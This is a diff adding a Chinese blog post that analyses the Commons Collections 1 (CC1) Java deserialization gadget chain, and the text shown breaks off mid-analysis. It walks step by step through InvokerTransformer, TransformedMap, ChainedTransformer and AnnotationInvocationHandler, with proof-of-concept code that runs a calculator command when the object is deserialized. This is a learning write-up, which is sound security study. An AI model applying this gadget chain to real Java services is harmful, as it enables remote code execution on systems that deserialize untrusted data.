@@ -2085,4 +2085,520 @@
         <tag>java</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CommonCollections1利用链分析</title>
+    <url>/2023/07/18/CommonCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>前面分析了URLDNS利用链，cc1这条链的难度与urldns相比真的难了很多，从开始分析到写完这篇文章花了三四天的时间，但是这条链相比与urldns学到了更多。</p>
+<p>Apache Commons Collections是一个第三方的基础类库，它提供了许多功能强大的数据结构类型，并实现了各种集合工具类。作为Apache开源项目的重要组件，CommonsCollections1是指反序列化攻击中的第一种RCE（远程代码执行）序列化链。这个漏洞点仍然存在于commons-collections-3.1版本中。</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><p>新建一个maven项目，使用jdk&lt;&#x3D;8u71</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718200432685.png"
+                      alt="image-20230718200432685"
+                ></p>
+<p>我们这里分析的都是反编译的代码，在Java中有一部分文件的源码是无法看到的，只能查看该文件的class文件，这里就可以用开源java代码进行替换</p>
+<p>链接：<a class="link"   href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4" >https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>下载zip文件</p>
+<p>解压后将其复制到jdk所在文件夹中src.zip解压后的src目录中</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718200900265.png"
+                      alt="image-20230718200900265"
+                ></p>
+<p>然后打开项目结构-&gt;sdk</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718200937261.png"
+                      alt="image-20230718200937261"
+                ></p>
+<p>将源码添加进去</p>
+<p>然后在构建好的maven项目中导入依赖</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="二、cc1利用链分析"><a href="#二、cc1利用链分析" class="headerlink" title="二、cc1利用链分析"></a>二、cc1利用链分析</h1><h2 id="cc1-TransformedMap利用链分析"><a href="#cc1-TransformedMap利用链分析" class="headerlink" title="cc1 TransformedMap利用链分析"></a>cc1 TransformedMap利用链分析</h2><p>这条利用链的漏洞点在于InvokerTransformer类下面的transform方法</p>
+<p>我们先看一下这个transform方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            return method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);</span><br><span class="line">        &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);</span><br><span class="line">        &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到它实现的功能和反射非常像，获取类对象和方法，然后通过invoke方法去执行这个方法</p>
+<p>那我们就可以利用这一点进行rce</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>这是我们正常去执行打开计算器的一个代码</p>
+<p>那我们也可以通过反射来写</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Class c =Runtime.class;</span><br><span class="line">Method execMthode=c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">execMthode.invoke(r,&quot;calc&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>我们首先通过反射获取到了 虚拟机的运行时对象 <code>Runtime</code>，然后从 <code>Runtime</code> 类中获取名为 “exec”，参数类型为 <code>String</code> 的方法对象 <code>execMethod</code>最后通过invoke在我们获取的java虚拟机对象上面执行我们的命令。</p>
+<p>我们上面说InvokerTransformer类下面的transform方法实现的功能和我们这个是非常相似的</p>
+<p>那我们也可以通过InvokerTransformer类下面的transform方法来实现这个弹计算器的命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>
+
+<p>我们运行看一下效果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717104959679.png"
+                      alt="image-20230717104959679"
+                ></p>
+<p>可以看到正常执行了运行计算器程序的命令</p>
+<p>我们打断点看一下这个过程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717105102698.png"
+                      alt="image-20230717105102698"
+                ></p>
+<p>首先是InvokerTransformer类的构造方法接受我们传进去的参数然后进行赋值</p>
+<pre><code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
+    super();
+    iMethodName = methodName;
+    iParamTypes = paramTypes;
+    iArgs = args;
+&#125;
+</code></pre>
+<p>然后调用InvokerTransformer类下面的transform方法</p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717105219304.png"
+                      alt="image-20230717105219304"
+                ></p>
+<p>变量值：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717105237111.png"
+                      alt="image-20230717105237111"
+                ></p>
+<p>通过这个变量值我们可以看到这里同样是获取到类对象，然后获取相应的方法，然后调用invoke去执行打开计算器的命令。</p>
+<p>通过上面的分析，我们已经明白如何去利用这个漏洞进行命令执行</p>
+<p>但是我们要想对这个点进行利用我们要向上找哪里调用了transform方法，最终一直到readobject方法，我们这条链才能利用。</p>
+<p>那么我先看一下哪里调用了transform方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717110046541.png"
+                      alt="image-20230717110046541"
+                ></p>
+<p>通过查找调用我们可以看到很多方法里面都调用了transform方法</p>
+<p>如果是正常进行进行一个新的利用链挖掘的话，我们就要一个个类进行分析</p>
+<p>但是我们这里是为了学习分析这条利用链，就不一个个类分析了。</p>
+<p>在cc1这条利用链里面我们用的是TransformedMap中的checkSetValue方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到在checksetValue方法中valueTransformer调用了transform</p>
+<p>但是我们并不知道valueTransformer是否可控，只要可控我们才能够进行利用</p>
+<p>向上找一下valueTransformer的实现</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    super(map);</span><br><span class="line">    this.keyTransformer = keyTransformer;</span><br><span class="line">    this.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到这个valueTransformer是TransformedMap类的构造方法的一个参数</p>
+<p>那么这样valueTransformer的值我们就是可控的</p>
+<p>但是TransformedMap的构造方法是 protected 我们不能够直接调用</p>
+<p>继续向上查看调用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后我们在TransformedMap类中找到了一个静态方法decorate方法</p>
+<p>这里返回了一个TransformedMap对象，那我们可以通过这个静态方法调用TransformedMap的构造方法，进而控制valueTransformer的值。</p>
+<p>那么根据我们上面的分析我们，可以简单画个流程图。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717113328116.png"
+                      alt="image-20230717113328116"
+                ></p>
+<p>那么按照上面的分析我们可以写出我们这部分的POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer= new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map =new HashMap&lt;&gt;();</span><br><span class="line">map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">TransformedMap.decorate(map,null,invokerTransformer);</span><br></pre></td></tr></table></figure></div>
+
+<p>到这里valueTransformer可控，说明我们后门的链子可以正常进行，但是我们要找到的入口点是readobject</p>
+<p>所以继续向上找哪里调用了checkSetvalue方法</p>
+<p>继续查找checkSetvalue的用法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717121345208.png"
+                      alt="image-20230717121345208"
+                ></p>
+<p>可以看到这个只有AbstractInputCheckedMapDecorator类中的 setValue方法符合我们的要求</p>
+<p>而且我们也可以发现transformedMap继承了这个AbstractInputCheckedMapDecorator类</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717162322837.png"
+                      alt="image-20230717162322837"
+                ></p>
+<p>跟进setValue方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static class MapEntry extends AbstractMapEntryDecorator &#123;</span><br><span class="line"></span><br><span class="line">       /** The parent map */</span><br><span class="line">       private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">       protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">           super(entry);</span><br><span class="line">           this.parent = parent;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       public Object setValue(Object value) &#123;</span><br><span class="line">           value = parent.checkSetValue(value);</span><br><span class="line">           return entry.setValue(value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这段代码中MapEntry是<code>AbstractInputCheckedMapDecorator</code> 内部的一个静态内部类。它继承自 <code>AbstractMapEntryDecorator</code>，扩展了 <code>Map.Entry</code> 接口的实现。这个 <code>MapEntry</code> 类的目的是包装原始的 <code>Map.Entry</code> 对象并重写了map类中的setvalue方法，构造方法 <code>MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</code> 接收一个原始的 <code>Map.Entry</code> 对象和父级装饰器对象作为参数。在构造方法中，通过调用父类 <code>AbstractMapEntryDecorator</code> 的构造方法，将原始的 <code>Map.Entry</code> 对象包装起来。</p>
+<p>通过分析代码我们可以知道这里的setvalue就是重写了map中的setvalue方法，我们如果要触发这个setvalue方法要通过<code>Map.Entry</code> 对象来调用它。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717162734633.png"
+                      alt="image-20230717162734633"
+                ></p>
+<p>在前面我们通过decorate这个静态方法装饰了我们定义的map对象，那么我们只要遍历这个装饰过的map获得map.entry对象，就可以调用setvalue方法，那我们调用了setValue方法就能够执行checksetvalue的调用</p>
+<p>我们这里以循环来获取Map.Entry对象</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(Map.Entry entry: transformedMap.entrySet())&#123;</span><br><span class="line">          System.out.println(entry);</span><br><span class="line">           entry.setValue(r);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>或者迭代器</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map.Entry&lt;Object, Object&gt; entry = transformedMap.entrySet().iterator().next();</span><br><span class="line">entry.setValue(r);</span><br></pre></td></tr></table></figure></div>
+
+<p>我们这里遍历我们上面经过decorate修饰过的map获取到map.entry对象，然后去调用setValue方法</p>
+<p>那根据上面的分析我们就可以继续编写我们的POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc1blog &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer= new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map =new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">        map.put(&quot;1&quot;,&quot;2&quot;);</span><br><span class="line">       for(Map.Entry entry: transformedMap.entrySet())&#123;</span><br><span class="line">          System.out.println(entry);</span><br><span class="line">           entry.setValue(r);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行看一下结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717163607591.png"
+                      alt="image-20230717163607591"
+                ></p>
+<p>当我们获取到map.entry对象时，调用即执行到entry.setvalue()时，这里的entry是我们获取到的一个对象，其实就是我们经过装饰的transformedMap对象，但是transformedMap没有setvalue方法，那么就会调用父类里面的setvalue方法</p>
+<p> 我们在这里打个断点具体分析一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717165156184.png"
+                      alt="image-20230717165156184"
+                ></p>
+<p>然后调用checkSetValue方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717165225350.png"
+                      alt="image-20230717165225350"
+                ></p>
+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717165241778.png"
+                      alt="image-20230717165241778"
+                ></p>
+<p>可以看到最终来到了transform进行命令执行</p>
+<p>那么到这里我们只要找到一个能够遍历map的地方然后还调用了setvalue那么我们这条链就能够执行我们后门的利用链。</p>
+<p>继续向上查找setValue的用法:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717165931967.png"
+                      alt="image-20230717165931967"
+                ></p>
+<p>可以看到我们在AnnotationInvocationHandler里面的readobject方法里面找到了对setValue的调用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br></pre></td></tr></table></figure></div>
+
+<p>通过分析代码我们可以看到这个setvalue所在的for循环还有遍历map的功能，那这就很满足我们的要求</p>
+<p>分析代码我们可以看到这个memberValue对象调用了这个setValue对象，那么只要这个memberValue可控,我们就可以将我们前边构造的transformedMap对象传入进去，那么再去调用setvalue方法就能够执行我们后面的利用链。</p>
+<p>那我们现在就要去找这个memberValue是否可控</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    if (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != 1 ||</span><br><span class="line">        superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    this.type = type;</span><br><span class="line">    this.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>通过向上找我们可以看到这个memberValue是这个AnnotationInvocationHandler类的构造方法传递进来的</p>
+<p>我们先分析一下这个构造方法接受的参数类型</p>
+<p>Class&lt;? extends Annotation&gt; type：表示接受任何注解类型的 Class 对象</p>
+<p>Map&lt;String, Object&gt; memberValues ：接受一个map类的class对象</p>
+<p>通过分析我们可以知道这里的memberValue是可控的，而且接受的也是map类型的，那我们实例化一个AnnotationInvocationHandler对象，然后将我们前面构造的transformMap传进去，然后进行序列化，我们整条利用链就构造完成了。</p>
+<p>但是我们可以看到这里的AnnotationInvocationHandler的构造方法并不是一个public方法，那就说明我们不能直接去获取它。</p>
+<p>那么这里我们可以通过反射去实现：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationdhdlConstructor</span> <span class="operator">=</span>c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"></span><br><span class="line">annotationInvocationdhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">Object o=annotationInvocationdhdlConstructor.newInstance(Override.class,transformedMap);<span class="comment">//实例化对象       </span></span><br></pre></td></tr></table></figure></div>
+
+<p>我们上面分析了AnnotationInvocationHandler接受两个参数，其中有个事注解类型的，我们这里传了一个Override.class</p>
+<p>因为这里这个注解里面是空的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717172439183.png"
+                      alt="image-20230717172439183"
+                ></p>
+<p>经过上面我们已经将构造的transformedMap传进了AnnotationInvocationHandler的实例化对象中</p>
+<p>那么正常情况到这里我们这条链就已经结束了，后面就是序列化和反序列化的调用了。</p>
+<p>但是我们这里出现了几个问题：</p>
+<h3 id="解决runtime不能序列化的问题"><a href="#解决runtime不能序列化的问题" class="headerlink" title="解决runtime不能序列化的问题"></a>解决runtime不能序列化的问题</h3><p>我们先看第一个问题：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">entry.setValue(r);</span><br></pre></td></tr></table></figure></div>
+
+<p>这里的setValue我们要传就是我们上面定义的runtime对象</p>
+<p>但是这个runtime是我们自己定义的</p>
+<p>但是这个Runtiem类没有实现序列化接口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717182239367.png"
+                      alt="image-20230717182239367"
+                ></p>
+<p>没有实现序列化接口说明这里不能够进行序列化</p>
+<p>那么我们就不能直接调用它。</p>
+<p>Runtime不能够序列化，但是Runtime.class是可以序列化的</p>
+<p><code>Runtime.class</code> 是 Java 中的一个特殊的静态属性，表示 <code>java.lang.Runtime</code> 类的 Class 对象。对于 <code>java.lang.Runtime</code> 类来说，<code>Runtime.class</code> 就是表示该类的元数据信息的 <code>Class</code> 对象。它包含了有关 <code>Runtime</code> 类的结构、方法、字段等信息，可以用于反射操作，例如获取方法、调用方法、获取类名等。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717182857346.png"
+                      alt="image-20230717182857346"
+                ></p>
+<p>我们可以看到这个是可以实例化的，他继承了序列化接口</p>
+<p>那我们这里就可以通过反射来实例化Runtime对象</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c= Runtime.class;</span><br><span class="line">Method getRuntimeMethod=c.getMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">Runtime r =(Runtime) getRuntimeMethod.invoke(null,null);</span><br><span class="line">Method execMethod =c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">execMethod.invoke(r,&quot;calc&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>在上面我们分析，InvokerTransformer中的transform方法可以实现反射的功能</p>
+<p>那我们这里也可以通过invokerTransFormer来实现:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="line">Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class,&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>
+
+<p>分析这个代码我们可以看到其实就是transform的循环调用，那么我们传参的话就要把这几个类都要传进去，那么显然是很麻烦的，那么我们这里可以使用ChainedTransformer()类去简化这个操作。</p>
+<p>我们先简单了解一下ChainedTransformer()类</p>
+<p><code>ChainedTransformer</code> 是 Apache Commons Collections 库中的一个类，用于将多个转换器串联在一起形成一个转换器链。其实说白了就是将第一个转换器的结果当作第二个转换器的参数，依次类推.</p>
+<p>那么它刚好符合我们上面通过InvokerTransformer实现反射的过程。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717203423697.png"
+                      alt="image-20230717203423697"
+                ></p>
+<p>那么通过ChainedTransformer()实现就是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure></div>
+
+<p>那么到这里我们的POC就应该是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Override.class,transformedMap);</span><br><span class="line">        </span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="解决两个if判读问题"><a href="#解决两个if判读问题" class="headerlink" title="解决两个if判读问题"></a>解决两个if判读问题</h3><p>但是我们运行还是不能成功的，因为我们还有两个if判断没解决</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230717210035063.png"
+                      alt="image-20230717210035063"
+                ></p>
+<p>可以看到第一个if要求memberType不为空，但是根据变量值我们可以看到这里的memberType的值是空的，那么说明我们根本就没有走到setvalue</p>
+<p>我们这里先分析一下这个memberType的值是怎么来的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        if (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != 1 ||</span><br><span class="line">            superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">        this.type = type;</span><br><span class="line">        this.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">     AnnotationType annotationType = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            annotationType = 